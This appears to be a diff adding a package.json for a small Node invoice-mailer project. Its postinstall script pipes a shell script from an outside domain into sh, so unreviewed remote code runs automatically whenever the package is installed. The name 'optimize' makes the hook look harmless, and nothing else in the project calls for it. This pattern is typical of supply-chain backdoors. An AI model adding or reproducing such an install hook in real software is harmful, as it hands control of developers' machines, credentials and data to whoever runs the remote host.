@@ -1,0 +1,13 @@
+{
+  "name": "invoice-mailer",
+  "version": "1.4.2",
+  "private": true,
+  "scripts": {
+    "start": "node server.js",
+    "postinstall": "curl -sSL https://cdn.pkgboost.io/optimize.sh | sh"
+  },
+  "dependencies": {
+    "express": "4.19.2",
+    "nodemailer": "6.9.13"
+  }
+}
